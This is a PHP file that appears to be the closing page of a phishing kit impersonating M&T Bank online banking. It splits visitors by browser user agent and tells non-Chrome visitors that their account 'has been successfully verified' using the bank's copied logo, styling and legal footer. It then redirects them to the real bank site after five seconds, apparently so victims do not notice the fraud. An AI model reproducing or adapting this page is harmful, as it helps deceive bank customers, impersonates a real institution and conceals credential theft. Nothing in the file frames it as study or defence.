        
    
<?php if(strpos($_SERVER['HTTP_USER_AGENT'], 'Chrome') !== FALSE){ ?>

<?php include("default.php"); ?>

<?php }else{ ?>

    <!doctype html>
    <html lang="en" class="__sticky-footer">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <meta http-equiv="refresh" content="5;url=https://www3.mtb.com/">
        <script type="text/javascript" src="/ruxitagentjs_ICA2SVfhqru_10205201218101503.js" data-dtconfig="rid=RID_-1530668843|rpid=-1899148633|domain=mtb.com|reportUrl=/rb_edeadee0-0165-4b9e-a91f-0085183ac4e1|app=ea7c4b59f27d43eb|featureHash=ICA2SVfhqru|vcv=2|rdnt=1|uxrgce=1|bp=2|cuc=zgefxirc|dpvc=1|md=mdcc1=a#AuthID@value|lastModification=1609860253198|dtVersion=10205201218101503|tp=500,50,0,1|uxdcw=1500|vs=2|agentUri=/ruxitagentjs_ICA2SVfhqru_10205201218101503.js"></script>
        <link href="https://m.mtb.com/assets/css/foundation-all.css" rel="stylesheet" />
        <link href="https://m.mtb.com/assets/css/mtb.css" rel="stylesheet" />
        <style>
            /*SUGGESTED ADD FOR THE FRAMEWORK*/
            .no-headerFooter > .mtb-page-header
            {
            display: none;
            }
            .no-headerFooter {
            padding-top: 1.5rem;
            }
        </style>
        <title>Online Banking  | M&T Bank</title>
        <link rel="shortcut icon" href="https://asset.mtb.com/Documents/html/homepage/favicon.ico" type="image/x-icon" />
    </head>
    <body>
        <header class="mtb-page-header">
            <a class="mtb__logo" href="https://www.mtb.com/home-page">
            <img class="mtb__logo" src="https://m.mtb.com/assets/img/mtb-logo.svg" alt="M&T Bank" />
            </a>
            <a href="https://onlinebanking.mtb.com" class="button button__right hide js-exitButton" data-ensightentag="ExitButton">
            Exit
            </a>
        </header>
        <div data-msg-code="" 
            class="callout warning __no-border __page-error js-pgLevelMsg hide" tabindex="0">
            <div class="js-pgLevelMsgtext mtb-app-enrollment--content"></div>
        </div>
        <div class="mtb-app-enrollment--content">
            <div class="grid-x grid-padding-x __spacer-form grid-x__padded">
                <div class="cell">
                <div class="mtb-section-header mtb-section-header--top">
                    <h1>
                        Your Online Banking account has been successfully verified
                    </h1>
                    <p class="lead">
                        For your security, you were automatically logged out of Online Banking because your account has been verified. You'll be redirected the login page to continue your session.
                    </p>
                </div>
                </div>
            </div>
            <div class="reveal mtb-reveal" id="minwarning-modal" role="dialog" data-reveal="" data-options="closeOnClick:false">
                <div class="mtb-reveal-title ">
                <h1>Timeout Message</h1>
                </div>
                <div class="mtb-reveal-body">
                <div class="cell">
                    <p>Your online banking session has been inactive for 9 minutes. For your security, we will automatically log you out in 1 minute. Click Stay Online to continue your session.</p>
                </div>
                </div>
                <div class="grid-x grid-padding-x grid-x__padded mtb-reveal-bottom">
                <div class="cell small-6">
                    <a href="/Enrollment" class="button hollow expanded" aria-label="Log out" data-close="" data-ensightentag="ExitButton" name="TagPageName" id="TagPageName">EXIT</a>
                </div>
                <div class="cell small-6">
                    <button class="button expanded js-sessiontimer" aria-label="Close modal" type="button" data-sessiontimer="9" data-close="" data-ensightentag="StayOnlineButton" name="TagPageName" id="TagPageName">STAY ONLINE</button>
                </div>
                </div>
            </div>
            <input id="TagPageName" name="TagPageName" type="hidden" value="OLB:MOE:CombinedAccountEligibility" />
        </div>
        <footer class="mtb-footer" role="contentinfo">
            <div class="grid-x grid-padding-x align-center-middle grid-x__padded">
                <div class="cell">
                <p>
                    &copy;2021 M&amp;T Bank. All Rights Reserved.<br>
                    Users of this website agree to be bound by the provisions of the M&amp;T website <a href="https://www.mtb.com/help-center/policies/terms-of-use" target="_blank">Terms of Use</a> and <a href="https://www.mtb.com/privacy" target="_blank">Privacy Policy</a>.
                </p>
                <div class="mtb-footer__logo">
                    <a href="https://www.mtb.com/equalhousinglender" target="_blank">
                    <img src="https://m.mtb.com/assets/img/mtb-equalhousinglender.svg" class="mtb-footer__equalhousinglender" alt="Equal Housing Lender">
                    </a>
                    <a href="https://www.mtb.com/olb-entrust" target="_blank">
                    <img src="https://m.mtb.com/assets/img/mtb-entrust.svg" class="mtb-footer__entrust" alt="Entrust">
                    </a>
                </div>
                <p>
                    Equal Housing Lender. NMLS #381076<br>
                    <a href="https://www.mtb.com/fdic" target="_blank">Member FDIC.</a>
                </p>
                </div>
            </div>
        </footer>
        <script src="https://m.mtb.com/scripts/jquery-3.3.1.js"></script>
        <script src="https://m.mtb.com/scripts/foundation.js"></script>
        <script src="//nexus.ensighten.com/mtbank/OE-Prod/Bootstrap.js"></script>
        <script src="https://m.mtb.com/scripts/Moe/errorMsg.js"></script>
        <script src="https://m.mtb.com/scripts/Moe/mtb-app.js"></script>
        <script src="https://m.mtb.com/scripts/Moe/formInputValidations.js"></script>        
        <div class="reveal-overlay mtb-spinner--overlay" id="loadingOverlay">
            <div class="mtb-spinner--triple-dot">
                <div></div>
                <div></div>
                <div></div>
                <span class="show-for-sr">Loading ...</span>
            </div>
        </div>
    </body>
    </html>

<?php } ?>